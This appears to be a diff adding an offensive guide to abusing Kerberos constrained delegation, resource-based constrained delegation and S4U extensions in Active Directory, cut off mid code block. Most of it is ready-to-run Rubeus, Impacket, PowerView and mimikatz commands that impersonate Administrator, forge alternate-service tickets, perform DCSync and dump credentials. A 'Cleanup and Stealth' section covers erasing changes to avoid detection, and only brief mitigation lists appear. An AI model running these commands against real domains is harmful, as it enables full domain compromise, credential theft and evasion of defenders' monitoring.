+- Restricted to msDS-AllowedToDelegateTo list
+- Alternative service names not validated
+
+#### Attack Execution with Rubeus
+
+**Basic Constrained Delegation:**
+```powershell
+# Compromise service account with constrained delegation
+# Service account: svc_web
+# Password: Password123!
+# Allowed to delegate to: MSSQLSvc/sql01.corp.local
+
+# Request TGT for service account
+.\Rubeus.exe asktgt /user:svc_web /password:Password123! /domain:corporation.local
+
+# Use S4U2Proxy to impersonate Administrator to SQL
+.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:MSSQLSvc/sql01.corp.local /user:svc_web /ticket:BASE64_TGT /nowrap /ptt
+
+# Verify ticket
+klist
+
+# Access SQL as Administrator
+```
+
+**With Protocol Transition (TrustedToAuthForDelegation):**
+```powershell
+# No user authentication needed!
+# Service can request ticket for ANY user
+
+# Get TGT for service account
+.\Rubeus.exe asktgt /user:svc_web /password:Password123! /domain:corporation.local /nowrap
+
+# S4U2Self to get forwardable ticket for Administrator
+# Then S4U2Proxy to get ticket for backend service
+.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:MSSQLSvc/sql01.corp.local /user:svc_web /ticket:BASE64_TGT /nowrap /ptt
+
+# Now have ticket to access SQL as Administrator
+```
+
+**Alternative Service Attack:**
+```powershell
+# Configured delegation: MSSQLSvc/sql01.corp.local
+# But request different service on same host
+
+# Request ticket for CIFS instead of MSSQL
+.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:MSSQLSvc/sql01.corp.local /altservice:CIFS /user:svc_web /ticket:BASE64_TGT /nowrap /ptt
+
+# Now have CIFS ticket to access file shares
+dir \\sql01.corp.local\c$
+
+# Request ticket for HTTP
+.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:MSSQLSvc/sql01.corp.local /altservice:HTTP /user:svc_web /ticket:BASE64_TGT /nowrap /ptt
+
+# Request ticket for LDAP (if SQL is DC)
+.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:MSSQLSvc/sql01.corp.local /altservice:LDAP /user:svc_web /ticket:BASE64_TGT /nowrap /ptt
+```
+
+**Multiple Alternative Services:**
+```powershell
+# Request multiple services at once
+.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:MSSQLSvc/sql01.corp.local /altservice:CIFS,HTTP,HOST,LDAP /user:svc_web /ticket:BASE64_TGT /nowrap
+
+# Get tickets for:
+# - CIFS (file shares)
+# - HTTP (web admin)
+# - HOST (WinRM, tasks)
+# - LDAP (AD queries if DC)
+```
+
+#### Attack Execution with Impacket
+
+**Using getST.py:**
+```bash
+# Get service ticket with impersonation
+getST.py -spn MSSQLSvc/sql01.corp.local -impersonate Administrator corporation.local/svc_web:Password123!
+
+# Output: Administrator.ccache
+
+# Use ticket
+export KRB5CCNAME=Administrator.ccache
+mssqlclient.py -k -no-pass Administrator@sql01.corp.local
+```
+
+**Alternative Service with Impacket:**
+```bash
+# Request CIFS instead of MSSQL
+getST.py -spn MSSQLSvc/sql01.corp.local -impersonate Administrator -altservice CIFS corporation.local/svc_web:Password123!
+
+# Use ticket for file access
+export KRB5CCNAME=Administrator.ccache
+smbclient.py -k -no-pass Administrator@sql01.corp.local
+
+# Request LDAP for AD access
+getST.py -spn MSSQLSvc/sql01.corp.local -impersonate Administrator -altservice LDAP corporation.local/svc_web:Password123!
+
+export KRB5CCNAME=Administrator.ccache
+secretsdump.py -k -no-pass -just-dc-ntlm Administrator@sql01.corp.local
+```
+
+**Using Computer Account Hash:**
+```bash
+# If computer account has delegation
+# Export computer account hash
+
+# Request ticket
+getST.py -spn CIFS/fileserver.corp.local -impersonate Administrator -hashes :COMPUTER_NTLM_HASH corporation.local/WEBSERVER$
+
+export KRB5CCNAME=Administrator.ccache
+smbexec.py -k -no-pass Administrator@fileserver.corp.local
+```
+
+### Privilege Escalation Scenarios
+
+#### Scenario 1: SQL Server to Domain Admin
+
+**Setup:**
+- Service account: svc_sql
+- Delegated to: MSSQLSvc/sql01.corp.local
+- SQL01 is also a Domain Controller (bad practice!)
+
+**Attack:**
+```powershell
+# 1. Compromise svc_sql (kerberoast, password spray, etc.)
+
+# 2. Get TGT for svc_sql
+.\Rubeus.exe asktgt /user:svc_sql /password:Cracked123! /domain:corp.local /nowrap
+
+# 3. Request LDAP ticket to DC as Domain Admin
+.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:MSSQLSvc/sql01.corp.local /altservice:LDAP /user:svc_sql /ticket:BASE64_TGT /nowrap /ptt
+
+# 4. Perform DCSync
+mimikatz # lsadump::dcsync /domain:corp.local /all /csv
+
+# 5. Extract krbtgt hash and create Golden Ticket
+```
+
+#### Scenario 2: Web Server to File Server Admin
+
+**Setup:**
+- Service account: svc_web
+- Delegated to: HTTP/web.corp.local
+- Web.corp.local hosts multiple services
+
+**Attack:**
+```powershell
+# 1. Compromise svc_web
+
+# 2. Request tickets with alternative services
+.\Rubeus.exe asktgt /user:svc_web /password:Password1 /domain:corp.local /nowrap
+
+# 3. Get CIFS ticket to access file shares
+.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:HTTP/web.corp.local /altservice:CIFS /user:svc_web /ticket:BASE64_TGT /nowrap /ptt
+
+# 4. Access admin shares
+dir \\web.corp.local\c$
+dir \\web.corp.local\admin$
+
+# 5. Deploy tools, dump credentials
+copy mimikatz.exe \\web.corp.local\c$\temp\
+```
+
+#### Scenario 3: Computer Account Delegation
+
+**Setup:**
+- Computer: APPSERVER
+- Delegated to: CIFS/fileserver.corp.local
+- APPSERVER compromised
+
+**Attack:**
+```powershell
+# 1. Extract computer account hash from SAM
+mimikatz # lsadump::sam
+
+# APPSERVER$:HASH
+
+# 2. Use computer account credentials
+.\Rubeus.exe asktgt /user:APPSERVER$ /rc4:HASH /domain:corp.local /nowrap
+
+# 3. Impersonate Domain Admin to file server
+.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:CIFS/fileserver.corp.local /user:APPSERVER$ /ticket:BASE64_TGT /nowrap /ptt
+
+# 4. Access file server as DA
+dir \\fileserver.corp.local\c$
+```
+
+### Advanced Techniques
+
+#### Chaining Delegations
+
+**Multiple Hops:**
+```
+Service A (constrained to Service B)
+    ↓
+Service B (constrained to Service C)
+    ↓
+Chain both delegations for access to Service C
+```
+
+**Example:**
+```powershell
+# Service A can delegate to Service B
+# Service B can delegate to Service C
+# Attacker compromises Service A
+
+# Step 1: A impersonates Admin to B
+.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:HTTP/serviceB.corp.local /user:svc_A /ticket:TGT_A /ptt
+
+# Step 2: Use ticket at B to delegate to C
+# (Requires access to Service B)
+# Extract ticket from Service B session
+# Use for further delegation
+```
+
+#### Cross-Domain Delegation
+
+**Trust Relationships:**
+```
+Domain A trusts Domain B
+    ↓
+Service in Domain A delegates to Service in Domain B
+    ↓
+Can impersonate users across domain boundary
+```
+
+**Attack:**
+```powershell
+# Service in DomainA configured to delegate to DomainB
+Get-ADUser svc_cross -Properties msDS-AllowedToDelegateTo
+
+# Shows: HTTP/server.domainB.local
+
+# Request cross-domain ticket
+.\Rubeus.exe s4u /impersonateuser:DomainB\Administrator /msdsspn:HTTP/server.domainB.local /user:DomainA\svc_cross /ticket:BASE64_TGT /domain:domainB.local /nowrap /ptt
+```
+
+#### Abusing Protocol Transition
+
+**No User Authentication Required:**
+```powershell
+# If TrustedToAuthForDelegation is set
+# Service can impersonate ANY user without their authentication
+
+# Check for protocol transition
+Get-ADUser svc_web -Properties TrustedToAuthForDelegation
+
+# Attack: Impersonate user who never authenticated
+.\Rubeus.exe s4u /impersonateuser:DomainAdmin /msdsspn:CIFS/fileserver.corp.local /user:svc_web /password:Pass123 /nowrap /ptt
+
+# Access resources as DomainAdmin (who never logged in!)
+```
+
+### Constrained Delegation Limitations
+
+**What Doesn't Work:**
+- Cannot delegate to services not in msDS-AllowedToDelegateTo list (but alternative services work)
+- Cannot delegate if target account is "Account is sensitive and cannot be delegated"
+- Protected Users group members cannot be impersonated
+- Tickets still expire (10 hours default)
+- Service account compromise required
+
+**Mitigations That Block:**
+- Account is Sensitive and Cannot be Delegated flag
+- Protected Users group membership
+- Restrict delegation to specific services (careful configuration)
+- Monitor S4U2Self/S4U2Proxy requests
+- Remove unnecessary delegation configurations
+
+---
+
+## 5. Resource-Based Constrained Delegation (RBCD)
+
+### Attack Overview
+
+**Core Concept:**
+RBCD allows a resource to specify which accounts are trusted to delegate to it. If an attacker has GenericWrite/GenericAll permissions on a computer object, they can configure that computer to trust an attacker-controlled account, enabling impersonation of any user to that computer.
+
+**Key Advantage:**
+```
+Traditional Delegation: Requires Domain Admin to configure
+RBCD: Can be configured by anyone with write access to computer object
+    ↓
+Lower privilege requirement
+    ↓
+Self-service privilege escalation
+```
+
+**Attack Chain:**
+```
+1. Find computer object with write permissions
+2. Create or compromise a computer account
+3. Configure RBCD on target to trust attacker's account
+4. Use S4U2Self to get ticket for any user
+5. Use S4U2Proxy to get ticket for target as that user
+6. Access target as privileged user
+```
+
+### Discovery and Reconnaissance
+
+#### Finding Write Permissions on Computer Objects
+
+**Using PowerView:**
+```powershell
+# Find computers where current user has GenericAll/GenericWrite
+Get-DomainObjectAcl -SearchBase "LDAP://OU=Computers,DC=corp,DC=local" | Where-Object {
+    ($_.SecurityIdentifier -eq $UserSID) -and 
+    (($_.ObjectAceType -eq "00000000-0000-0000-0000-000000000000") -or 
+     ($_.ObjectAceType -eq "bf967a86-0de6-11d0-a285-00aa003049e2"))
+} | Select-Object ObjectDN
+
+# Find computers where Domain Users have write access (misconfiguration)
+Get-DomainObjectAcl -SearchBase "LDAP://OU=Computers,DC=corp,DC=local" -ResolveGUIDs | Where-Object {
+    ($_.SecurityIdentifier -match "S-1-5-21-.*-513") -and 
+    ($_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteProperty")
+} | Select-Object ObjectDN,ActiveDirectoryRights
+```
+
+**Using BloodHound:**
+```cypher
+# Find computers where user has write permissions
+MATCH (u:User {name:"USER@CORPORATION.LOCAL"})-[r:GenericAll|GenericWrite|WriteProperty]->(c:Computer) 
+RETURN c.name
+
+# Find computers writable by groups user is member of
+MATCH (u:User {name:"USER@CORPORATION.LOCAL"})-[r:MemberOf*1..]->(g:Group)-[r2:GenericAll|GenericWrite|WriteProperty]->(c:Computer)
+RETURN c.name
+
+# Shortest path to computers with write access
+MATCH p=shortestPath((u:User {name:"USER@CORPORATION.LOCAL"})-[*1..]->(c:Computer))
+WHERE ANY(rel IN relationships(p) WHERE type(rel) IN ["GenericAll","GenericWrite","WriteProperty"])
+RETURN p
+```
+
+**Manual Enumeration:**
+```powershell
+# Check ACL on specific computer
+(Get-Acl "AD:\CN=FILESERVER,OU=Computers,DC=corp,DC=local").Access | Where-Object {
+    $_.IdentityReference -like "*Domain Users*" -or 
+    $_.IdentityReference -like "*$env:USERNAME*"
+} | Select-Object IdentityReference,ActiveDirectoryRights
+```
+
+#### Finding Existing RBCD Configurations
+
+**Check for Existing RBCD:**
+```powershell
+# Find computers with RBCD configured
+Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity | Where-Object {
+    $_.'msDS-AllowedToActOnBehalfOfOtherIdentity' -ne $null
+} | Select-Object Name,DNSHostName
+
+# Parse RBCD settings
+$computer = Get-ADComputer "TARGET" -Properties msDS-AllowedToActOnBehalfOfOtherIdentity
+if($computer.'msDS-AllowedToActOnBehalfOfOtherIdentity') {
+    $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $computer.'msDS-AllowedToActOnBehalfOfOtherIdentity', 0
+    foreach($ace in $SD.DiscretionaryAcl) {
+        $ace.SecurityIdentifier
+    }
+}
+```
+
+**Using PowerView:**
+```powershell
+# Find RBCD configurations
+Get-DomainComputer | Where-Object {
+    $_.msds-allowedtoactonbehalfofotheridentity -ne $null
+}
+```
+
+### Creating or Compromising Computer Account
+
+#### Method 1: Create New Computer Account
+
+**Default Domain Users Can Add 10 Computers:**
+```powershell
+# Check MachineAccountQuota
+Get-ADDomain | Select-Object -ExpandProperty DistinguishedName | ForEach-Object {
+    Get-ADObject $_ -Properties ms-DS-MachineAccountQuota
+}
+
+# Default: ms-DS-MachineAccountQuota = 10
+
+# Create computer account with PowerMad
+Import-Module .\Powermad.ps1
+New-MachineAccount -MachineAccount "ATTACKER-PC" -Password $(ConvertTo-SecureString 'Password123!' -AsPlainText -Force)
+
+# Verify creation
+Get-ADComputer "ATTACKER-PC"
+```
+
+**Using Impacket (addcomputer.py):**
+```bash
+# Create computer account from Linux
+addcomputer.py -computer-name 'ATTACKER-PC$' -computer-pass 'Password123!' -dc-ip 10.10.10.10 corporation.local/user:password
+
+# Verify
+ldapsearch -x -H ldap://10.10.10.10 -D "user@corporation.local" -w password -b "DC=corporation,DC=local" "(samaccountname=ATTACKER-PC$)"
+```
+
+#### Method 2: Compromise Existing Computer
+
+**If Already Admin on a Computer:**
+```cmd
+# Extract computer account hash
+mimikatz # privilege::debug
+mimikatz # lsadump::sam
+
+# Look for COMPUTERNAME$ account
+# Use this hash for RBCD attack
+```
+
+#### Method 3: Take Over Existing Computer
+
+**If Computer is Disabled/Stale:**
+```powershell
+# Find disabled computers
+Get-ADComputer -Filter {Enabled -eq $false} | Select-Object Name,LastLogonDate
+
+# If you have write access, reset password
+Set-ADAccountPassword -Identity "OLD-COMPUTER$" -NewPassword (ConvertTo-SecureString "NewPass123!" -AsPlainText -Force)
+```
+
+### Configuring RBCD
+
+#### Set RBCD with PowerView
+
+**Grant Delegation Rights:**
+```powershell
+# Import PowerView
+Import-Module .\PowerView.ps1
+
+# Get SID of attacker-controlled computer
+$AttackerSID = Get-DomainComputer "ATTACKER-PC" | Select-Object -ExpandProperty objectsid
+
+# Get target computer
+$TargetComputer = Get-DomainComputer "FILESERVER"
+
+# Create security descriptor
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($AttackerSID))"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+
+# Set RBCD on target
+Get-DomainComputer "FILESERVER" | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+
+# Verify
+Get-DomainComputer "FILESERVER" -Properties msds-allowedtoactonbehalfofotheridentity
+```
+
+#### Set RBCD with Native PowerShell
+
+**Using AD Module:**
+```powershell
+# Get attacker computer object
+$AttackerComputer = Get-ADComputer "ATTACKER-PC"
+
+# Set RBCD on target
+Set-ADComputer "FILESERVER" -PrincipalsAllowedToDelegateToAccount $AttackerComputer
+
+# Verify
+Get-ADComputer "FILESERVER" -Properties PrincipalsAllowedToDelegateToAccount | Select-Object -ExpandProperty PrincipalsAllowedToDelegateToAccount
+```
+
+#### Set RBCD with Impacket (rbcd.py)
+
+**From Linux:**
+```bash
+# Set RBCD
+rbcd.py -delegate-from 'ATTACKER-PC$' -delegate-to 'FILESERVER$' -action write corporation.local/user:password
+
+# Output shows RBCD configured
+
+# Verify
+rbcd.py -delegate-to 'FILESERVER$' -action read corporation.local/user:password
+```
+
+### Exploitation
+
+#### Using Rubeus
+
+**Full Attack Flow:**
+```powershell
+# 1. Create computer account (or use existing)
+# ATTACKER-PC$ with password Password123!
+
+# 2. Configure RBCD on target
+# (Already done in previous step)
+
+# 3. Get TGT for attacker-controlled computer
+.\Rubeus.exe asktgt /user:ATTACKER-PC$ /password:Password123! /domain:corporation.local /nowrap
+
+# 4. Perform S4U2Self and S4U2Proxy
+.\Rubeus.exe s4u /user:ATTACKER-PC$ /impersonateuser:Administrator /msdsspn:CIFS/fileserver.corporation.local /ticket:BASE64_TGT /nowrap /ptt
+
+# 5. Verify ticket
+klist
+
+# 6. Access target as Administrator
+dir \\fileserver.corporation.local\c$
+```
+
+**Alternative Services:**
+```powershell
+# Request multiple services
+.\Rubeus.exe s4u /user:ATTACKER-PC$ /impersonateuser:Administrator /msdsspn:CIFS/fileserver.corporation.local /altservice:HTTP,LDAP,HOST /ticket:BASE64_TGT /nowrap /ptt
+
+# Now have tickets for:
+# - CIFS (file access)
+# - HTTP (web admin)
+# - LDAP (if DC)
+# - HOST (WinRM, tasks)
+```
+
+#### Using Impacket (getST.py)
+
+**From Linux:**
+```bash
+# 1. Get service ticket with impersonation
+getST.py -spn CIFS/fileserver.corporation.local -impersonate Administrator -dc-ip 10.10.10.10 corporation.local/'ATTACKER-PC$':'Password123!'
+
+# Output: Administrator.ccache
+
+# 2. Use ticket
+export KRB5CCNAME=Administrator.ccache
+smbclient.py -k -no-pass Administrator@fileserver.corporation.local
+
+# Or
+smbexec.py -k -no-pass Administrator@fileserver.corporation.local
+```
+
+**Alternative Services:**
+```bash
+# Request LDAP ticket (if fileserver is DC)
+getST.py -spn CIFS/dc01.corporation.local -impersonate Administrator -altservice LDAP -dc-ip 10.10.10.10 corporation.local/'ATTACKER-PC$':'Password123!'
+
+export KRB5CCNAME=Administrator.ccache
+secretsdump.py -k -no-pass Administrator@dc01.corporation.local
+```
+
+### Privilege Escalation Scenarios
+
+#### Scenario 1: Domain User to Local Admin
+
+**Setup:**
+- Current user has GenericWrite on FILESERVER
+- MachineAccountQuota allows computer creation
+
+**Attack:**
+```powershell
+# 1. Create computer account
+New-MachineAccount -MachineAccount "ATTACKER-PC" -Password $(ConvertTo-SecureString 'Pass123!' -AsPlainText -Force)
+
+# 2. Configure RBCD
+Set-ADComputer "FILESERVER" -PrincipalsAllowedToDelegateToAccount (Get-ADComputer "ATTACKER-PC")
+
+# 3. Get TGT
+.\Rubeus.exe asktgt /user:ATTACKER-PC$ /password:Pass123! /nowrap
+
+# 4. Impersonate local admin
+.\Rubeus.exe s4u /user:ATTACKER-PC$ /impersonateuser:Administrator /msdsspn:CIFS/fileserver.corp.local /ticket:TGT /nowrap /ptt
+
+# 5. Access as local admin
+psexec.exe \\fileserver.corp.local cmd
+```
+
+#### Scenario 2: Compromised Workstation to Server Access
+
+**Setup:**
+- Admin on WORKSTATION01
+- GenericWrite on SQLSERVER
+
+**Attack:**
+```cmd
+# 1. Extract workstation computer account hash
+mimikatz # lsadump::sam
+# WORKSTATION01$:HASH
+
+# 2. Configure RBCD
+Set-ADComputer "SQLSERVER" -PrincipalsAllowedToDelegateToAccount (Get-ADComputer "WORKSTATION01")
+
+# 3. Get TGT with computer hash
+.\Rubeus.exe asktgt /user:WORKSTATION01$ /rc4:HASH /nowrap
+
+# 4. Impersonate Domain Admin
+.\Rubeus.exe s4u /user:WORKSTATION01$ /impersonateuser:DomainAdmin /msdsspn:MSSQLSvc/sqlserver.corp.local /altservice:CIFS,HTTP,HOST /ticket:TGT /nowrap /ptt
+
+# 5. Full access to SQL server
+dir \\sqlserver.corp.local\c$
+```
+
+#### Scenario 3: Service Account to Domain Controller
+
+**Setup:**
+- Compromised service account has GenericAll on DC01
+- Goal: DCSync
+
+**Attack:**
+```powershell
+# 1. Create computer account
+New-MachineAccount -MachineAccount "EVIL-PC" -Password $(ConvertTo-SecureString 'Evil123!' -AsPlainText -Force)
+
+# 2. Configure RBCD on Domain Controller
+Set-ADComputer "DC01" -PrincipalsAllowedToDelegateToAccount (Get-ADComputer "EVIL-PC")
+
+# 3. Get TGT for EVIL-PC
+.\Rubeus.exe asktgt /user:EVIL-PC$ /password:Evil123! /nowrap
+
+# 4. Impersonate Administrator to DC with LDAP service
+.\Rubeus.exe s4u /user:EVIL-PC$ /impersonateuser:Administrator /msdsspn:CIFS/dc01.corp.local /altservice:LDAP /ticket:TGT /nowrap /ptt
+
+# 5. Perform DCSync
+mimikatz # lsadump::dcsync /domain:corp.local /all /csv
+
+# 6. Extract krbtgt and create Golden Ticket
+```
+
+### Advanced RBCD Techniques
+
+#### Targeting Multiple Computers
+
+**Batch Configuration:**
+```powershell
+# Get list of computers with write access
+$targets = Get-DomainObjectAcl | Where-Object {
+    ($_.ActiveDirectoryRights -match "GenericWrite|GenericAll") -and
+    ($_.ObjectType -eq "Computer")
+} | Select-Object -ExpandProperty ObjectDN
+
+# Configure RBCD on all targets
+$AttackerComputer = Get-ADComputer "ATTACKER-PC"
+foreach($target in $targets) {
+    Set-ADComputer $target -PrincipalsAllowedToDelegateToAccount $AttackerComputer
+    Write-Host "[+] Configured RBCD on $target"
+}
+```
+
+#### Cleanup and Stealth
+
+**Remove RBCD Configuration:**
+```powershell
+# After exploitation, remove RBCD to avoid detection
+Set-ADComputer "FILESERVER" -PrincipalsAllowedToDelegateToAccount $null
+
+# Or with PowerView
+Get-DomainComputer "FILESERVER" | Set-DomainObject -Clear msds-allowedtoactonbehalfofotheridentity
+
+# Delete created computer account
+Remove-ADComputer "ATTACKER-PC" -Confirm:$false
+```
+
+**Temporary Configuration:**
+```powershell
+# Configure, exploit, clean up in rapid succession
+Set-ADComputer "TARGET" -PrincipalsAllowedToDelegateToAccount $Attacker
+.\Rubeus.exe s4u /user:ATTACKER-PC$ /impersonate:Admin /msdsspn:CIFS/target /ticket:TGT /ptt
+# Perform actions
+Set-ADComputer "TARGET" -PrincipalsAllowedToDelegateToAccount $null
+```
+
+#### Abusing Group Permissions
+
+**If Group Has Write Access:**
+```powershell
+# Find groups with write access
+Get-DomainObjectAcl -SearchBase "LDAP://OU=Computers,DC=corp,DC=local" -ResolveGUIDs | Where-Object {
+    ($_.ActiveDirectoryRights -match "GenericWrite|GenericAll") -and
+    ($_.SecurityIdentifier -match "S-1-5-21-.*-(512|513|514|515)")
+}
+
+# If current user is in that group, can configure RBCD
+# Example: IT Support group has write access on servers
+```
+
+### RBCD Limitations
+
+**What Doesn't Work:**
+- Requires write permissions on target computer object
+- MachineAccountQuota may be 0 (can't create computers)
+- Need to control or create a computer account
+- Protected Users group members can't be impersonated
+- "Account is sensitive" flag blocks delegation
+- Some detections focus on RBCD changes
+
+**Mitigations That Block:**
+- Set MachineAccountQuota to 0
+- Audit and restrict GenericWrite/GenericAll on computer objects
+- Monitor msDS-AllowedToActOnBehalfOfOtherIdentity changes
+- Protected Users group for privileged accounts
+- "Account is sensitive and cannot be delegated" flag
+---
+
+## 6. S4U2Self and S4U2Proxy Abuse
+
+### Understanding S4U Extensions in Depth
+
+#### S4U2Self (Service for User to Self)
+
+**Purpose:**
+Allows a service to obtain a service ticket to itself on behalf of a user, even when the user authenticated using a non-Kerberos protocol.
+
+**Technical Process:**
+```
+1. User authenticates to Service A (via NTLM, Forms Auth, etc.)
+2. Service A requests ticket for itself as User
+3. KDC issues ticket: User → Service A
+4. If TrustedToAuthForDelegation set: Ticket is FORWARDABLE
+5. Service A can now use ticket for further delegation
+```
+
+**Protocol Flow:**
+```
+Service A                                KDC
+    |                                     |
+    |--TGS-REQ (S4U2Self)---------------->|
+    |  Service: Service A                 |
+    |  On behalf of: User                 |
+    |  PA-FOR-USER authenticator          |
+    |                                     |
+    |<--TGS-REP---------------------------|
+    |  Service Ticket: User → Service A   |
+    |  (Forwardable if TrustedToAuth set) |
+```
+
+**When It's Used:**
+- Web application with forms authentication
+- Legacy applications using NTLM
+- Services that can't get user's Kerberos ticket
+- Protocol transition scenarios
+
+#### S4U2Proxy (Service for User to Proxy)
+
+**Purpose:**
+Allows a service to obtain a service ticket to another service on behalf of a user.
+
+**Technical Process:**
+```
+1. Service A has forwardable ticket for User (from S4U2Self or user auth)
+2. Service A requests ticket for Service B as User
+3. KDC checks msDS-AllowedToDelegateTo or RBCD configuration
+4. If allowed, KDC issues ticket: User → Service B
+5. Service A uses ticket to access Service B as User
+```
+
+**Protocol Flow:**
+```
+Service A                                KDC                    Service B
+    |                                     |                        |
+    |--TGS-REQ (S4U2Proxy)--------------->|                        |
+    |  Service: Service B                 |                        |
+    |  On behalf of: User                 |                        |
+    |  Evidence: Forwardable ticket       |                        |
+    |  Additional Ticket: Service A TGT   |                        |
+    |                                     |                        |
+    |                Check:                |                        |
+    |                - Is delegation allowed?                       |
+    |                - Is ticket forwardable?                       |
+    |                                     |                        |
+    |<--TGS-REP---------------------------|                        |
+    |  Service Ticket: User → Service B   |                        |
+    |                                     |                        |
+    |--AP-REQ (Service Ticket)----------------------------->      |
+    |                                                        |     |
+    |<--AP-REP (Access Granted)-----------------------------------|
+```
+
+### S4U2Self Abuse Scenarios
+
+#### Scenario 1: Impersonating Any User Without Their Ticket
+
+**Setup:**
+- Service account with `TrustedToAuthForDelegation` flag
+- No user authentication needed
+
+**Attack:**
+```powershell
+# Service account can request ticket for ANY user
+# Even if that user never authenticated!
+
+# 1. Get TGT for service account
+.\Rubeus.exe asktgt /user:svc_web /password:Password123! /domain:corp.local /nowrap
+
+# 2. Use S4U2Self to get forwardable ticket for Domain Admin
+.\Rubeus.exe s4u /user:svc_web /impersonateuser:Administrator /self /ticket:BASE64_TGT /nowrap
+
+# Result: Forwardable ticket for Administrator
+# Can be used for S4U2Proxy to access backend services
+```
+
+**Why This is Dangerous:**
+```
+Normal: User authenticates → Service gets ticket
+Abused: Service requests ticket without user authentication
+    ↓
+Can impersonate users who never logged in
+Can impersonate disabled accounts
+Can impersonate accounts that don't exist
+```
+
+#### Scenario 2: Forwardable Ticket Generation
+
+**Create Forwardable Tickets for Delegation:**
+```powershell
+# Without TrustedToAuthForDelegation: Ticket is NOT forwardable
+# With TrustedToAuthForDelegation: Ticket IS forwardable
+
+# Check if service has protocol transition
+Get-ADUser svc_web -Properties TrustedToAuthForDelegation
+
+# If True, can generate forwardable tickets
+.\Rubeus.exe s4u /user:svc_web /impersonateuser:TargetUser /self /ticket:TGT /nowrap /ptt
+
+# Ticket can now be used for further delegation
+```
+
+#### Scenario 3: Bypassing Kerberos Pre-Authentication
+
+**Impersonate Users with "Do Not Require Kerberos Pre-Auth":**
+```powershell
+# Find users without pre-auth
+Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true}
+
+# Service can impersonate these users even more easily
+.\Rubeus.exe s4u /user:svc_web /impersonateuser:NoPreAuthUser /self /ticket:TGT /nowrap
+```
+
+### S4U2Proxy Abuse Scenarios
+
+#### Scenario 1: Alternative Service Name Attack
+
+**The Vulnerability:**
+The KDC does NOT validate the service class, only the hostname in the SPN.
+
+**Example:**
+```
+Configured delegation: MSSQLSvc/sql.corp.local
+    ↓
+Can request: MSSQLSvc/sql.corp.local ✓ (allowed)
+Can request: CIFS/sql.corp.local ✓ (not validated!)
+Can request: HTTP/sql.corp.local ✓ (not validated!)
+Can request: LDAP/sql.corp.local ✓ (not validated!)
+Can request: HOST/sql.corp.local ✓ (not validated!)
+```
+
+**Attack:**
+```powershell
+# Configured for SQL access only
+# But request file share access
+
+# 1. Get TGT for service account
+.\Rubeus.exe asktgt /user:svc_web /password:Pass123! /nowrap
+
+# 2. Request ticket with alternative service
+.\Rubeus.exe s4u /user:svc_web /impersonateuser:Administrator /msdsspn:MSSQLSvc/sql.corp.local /altservice:CIFS /ticket:TGT /nowrap /ptt
+
+# 3. Access file shares instead of database
+dir \\sql.corp.local\c$
+```
+
+**All Possible Alternative Services:**
+```powershell
+# From any configured SPN, can request:
+# - CIFS (file shares)
+# - HTTP (web services)
+# - LDAP (directory services)
+# - HOST (WinRM, scheduled tasks, RPC)
+# - WSMAN (PowerShell remoting)
+# - TERMSRV (Remote Desktop)
+# - MSSQLSvc (SQL Server)
+# - Any other service on that host
+
+# Request all at once
+.\Rubeus.exe s4u /user:svc_web /impersonateuser:Administrator /msdsspn:MSSQLSvc/sql.corp.local /altservice:CIFS,HTTP,HOST,LDAP,WSMAN /ticket:TGT /nowrap
+```
+
+#### Scenario 2: Protocol Transition Full Chain
+
+**Complete S4U2Self + S4U2Proxy Attack:**
+```powershell
+# 1. Service account with protocol transition
+# TrustedToAuthForDelegation = True
+# msDS-AllowedToDelegateTo = HTTP/backend.corp.local
+
+# 2. Get service account TGT
+.\Rubeus.exe asktgt /user:svc_web /password:Password1 /domain:corp.local /nowrap
+
+# 3. S4U2Self: Get forwardable ticket for Domain Admin
+# (Domain Admin doesn't need to authenticate!)
+.\Rubeus.exe s4u /user:svc_web /impersonateuser:Administrator /self /ticket:SERVICE_TGT /nowrap
+
+# 4. S4U2Proxy: Use that ticket to access backend
+.\Rubeus.exe s4u /user:svc_web /impersonateuser:Administrator /msdsspn:HTTP/backend.corp.local /ticket:SERVICE_TGT /nowrap /ptt
+
+# 5. Access backend as Administrator
+# Administrator never authenticated to service!
+```
+
+#### Scenario 3: Cross-Service Impersonation
+
+**Accessing Multiple Services:**
+```powershell
+# Service configured to delegate to multiple SPNs
+Get-ADUser svc_app -Properties msDS-AllowedToDelegateTo
+
+# Output:
+# HTTP/web.corp.local
+# MSSQLSvc/sql.corp.local
+# CIFS/fileserver.corp.local
+
+# Request tickets for all services
+.\Rubeus.exe asktgt /user:svc_app /password:Pass123! /nowrap
+
+# Access web server
+.\Rubeus.exe s4u /user:svc_app /impersonateuser:Administrator /msdsspn:HTTP/web.corp.local /ticket:TGT /nowrap /ptt
+
+# Access SQL server
+.\Rubeus.exe s4u /user:svc_app /impersonateuser:Administrator /msdsspn:MSSQLSvc/sql.corp.local /ticket:TGT /nowrap /ptt
+
+# Access file server
+.\Rubeus.exe s4u /user:svc_app /impersonateuser:Administrator /msdsspn:CIFS/fileserver.corp.local /ticket:TGT /nowrap /ptt
+```
+
+### Advanced S4U Techniques
+
+#### Chained S4U Attacks
+
+**Multi-Hop Delegation:**
+```
+Service A → Service B → Service C
+    ↓
+Service A uses S4U to impersonate to B
+Service B uses S4U to impersonate to C
+Result: Access to C through A
+```
+
+**Implementation:**
+```powershell
+# Compromise Service A
+# Service A can delegate to Service B
+# Service B can delegate to Service C
+
+# Step 1: A → B as Administrator
+.\Rubeus.exe s4u /user:svc_A /impersonateuser:Administrator /msdsspn:HTTP/serviceB.corp.local /ticket:TGT_A /nowrap /ptt
+
